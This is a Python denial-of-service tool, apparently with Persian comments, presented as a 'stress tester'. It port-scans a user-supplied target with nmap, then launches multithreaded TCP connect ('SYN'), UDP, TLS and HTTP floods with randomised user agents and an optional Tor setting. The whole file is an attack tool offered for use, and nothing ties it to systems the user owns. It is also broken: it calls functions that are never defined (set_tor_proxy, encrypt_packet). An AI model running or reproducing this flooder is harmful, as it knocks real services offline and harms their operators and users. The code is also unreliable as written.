import socket
import threading
import requests
import dns.resolver
import time
import random
from cryptography.fernet import Fernet
import nmap
import socks
import ssl
import logging
from fake_useragent import UserAgent
from colorama import Fore, Style, init

# Initialize colorama
init()

# ---- تنظیمات پیشرفته ----
ENCRYPTION_KEY = Fernet.generate_key()
fernet = Fernet(ENCRYPTION_KEY)
MAX_THREADS = 1000
REQUEST_DELAY = 0.1
TOR_PROXY = False

# ---- لاگ‌گیری و نمایش در ترمینال ----
logging.basicConfig(
    filename='stress_test.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def print_status(message, level="info"):
    """نمایش وضعیت در ترمینال با رنگ‌بندی"""
    colors = {
        "info": Fore.BLUE,
        "success": Fore.GREEN,
        "warning": Fore.YELLOW,
        "error": Fore.RED,
        "critical": Fore.RED + Style.BRIGHT
    }
    color = colors.get(level.lower(), Fore.WHITE)
    print(f"{color}[{time.strftime('%H:%M:%S')}] {message}{Style.RESET_ALL}")
    logging.log(
        getattr(logging, level.upper(), logging.INFO),
        message
    )

# ---- دریافت خودکار IP و پورت‌ها ----
def get_target_info(url):
    try:
        print_status("Resolving target domain...", "info")
        domain = url.split("//")[-1].split("/")[0]
        ip = socket.gethostbyname(domain)
        print_status(f"Target IP resolved: {ip}", "success")
        
        print_status("Scanning for open ports...", "info")
        open_ports = scan_ports(ip)
        if open_ports:
            print_status(f"Open ports found: {open_ports}", "success")
        else:
            print_status("No open ports found, using default port 80", "warning")
            open_ports = [80]
            
        return ip, open_ports
    except Exception as e:
        print_status(f"Error resolving target: {str(e)}", "error")
        return None, None

# ---- اسکن پورت‌های باز با NMAP ----
def scan_ports(ip):
    try:
        scanner = nmap.PortScanner()
        print_status(f"Starting port scan on {ip}...", "info")
        scanner.scan(ip, arguments='-p 1-1000 -T4')
        open_ports = [port for port in scanner[ip]['tcp'] if scanner[ip]['tcp'][port]['state'] == 'open']
        return open_ports
    except Exception as e:
        print_status(f"Port scan failed: {str(e)}", "error")
        return []

# ---- حمله ترکیبی پیشرفته ----
def advanced_attack(target_ip, target_ports):
    print_status("Initializing attack modules...", "info")
    
    # 1. TCP SYN Flood
    def syn_flood(port):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, port))
                encrypted_data = encrypt_packet(f"SYN_FLOOD_{random.randint(1, 1000)}")
                s.send(encrypted_data)
                print_status(f"SYN packet sent to {target_ip}:{port}", "info")
                time.sleep(0.01)
            except Exception as e:
                print_status(f"SYN Flood error on port {port}: {str(e)}", "warning")

    # 2. HTTP Flood
    def http_flood():
        ua = UserAgent()
        while True:
            try:
                headers = {
                    "User-Agent": ua.random,
                    "X-Attack": str(random.randint(1, 1000)),
                    "Accept-Language": "en-US,en;q=0.9"
                }
                response = requests.get(f"http://{target_ip}", headers=headers, timeout=2)
                print_status(f"HTTP request sent (Status: {response.status_code})", "info")
                time.sleep(REQUEST_DELAY)
            except Exception as e:
                print_status(f"HTTP Flood error: {str(e)}", "warning")

    # 3. UDP Flood
    def udp_flood(port):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                large_packet = random._urandom(2048)
                s.sendto(large_packet, (target_ip, port))
                print_status(f"UDP packet sent to {target_ip}:{port}", "info")
                time.sleep(0.1)
            except Exception as e:
                print_status(f"UDP Flood error on port {port}: {str(e)}", "warning")

    # 4. SSL/TLS Flood
    def ssl_flood(port):
        context = ssl.create_default_context()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                ssl_sock = context.wrap_socket(s, server_hostname=target_ip)
                ssl_sock.connect((target_ip, port))
                ssl_sock.send(encrypt_packet("HTTPS_FLOOD"))
                print_status(f"HTTPS packet sent to {target_ip}:{port}", "info")
                time.sleep(0.05)
            except Exception as e:
                print_status(f"SSL Flood error on port {port}: {str(e)}", "warning")

    # اجرای حملات
    print_status(f"Launching attacks on {target_ip} (Ports: {target_ports})", "success")
    
    attacks = [syn_flood, udp_flood, ssl_flood]
    threads = []
    
    for port in target_ports:
        for attack in attacks:
            t = threading.Thread(target=attack, args=(port,))
            t.daemon = True
            threads.append(t)
            t.start()
    
    for _ in range(MAX_THREADS // 2):
        t = threading.Thread(target=http_flood)
        t.daemon = True
        threads.append(t)
        t.start()

    print_status(f"Attack running with {len(threads)} active threads", "success")
    
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            print_status("Attack stopped by user", "warning")
            break

# ---- اجرای اصلی ----
if __name__ == "__main__":
    try:
        print(Fore.CYAN + """
  _____ _______       _____ _______       _____ _______      
 / ____|__   __|/\   / ____|__   __|/\   / ____|__   __|/\   
| (___    | |  /  \ | |       | |  /  \ | |       | |  /  \  
 \___ \   | | / /\ \| |       | | / /\ \| |       | | / /\ \ 
 ____) |  | |/ ____ \ |____   | |/ ____ \ |____   | |/ ____ \\
|_____/   |_/_/    \_\_____|  |_/_/    \_\_____|  |_/_/    \_\\
        """ + Style.RESET_ALL)
        
        print_status("Starting advanced stress tester", "info")
        set_tor_proxy()
        
        TARGET_URL = input(Fore.YELLOW + "[?] Enter TEST URL (e.g., http://example.com): " + Style.RESET_ALL).strip()
        target_ip, target_ports = get_target_info(TARGET_URL)
        
        if target_ip and target_ports:
            print_status("Press CTRL+C to stop the attack", "warning")
            advanced_attack(target_ip, target_ports)
        else:
            print_status("Target resolution failed", "error")
            
    except KeyboardInterrupt:
        print_status("\nScript terminated by user", "warning")
    except Exception as e:
        print_status(f"Fatal error: {str(e)}", "critical")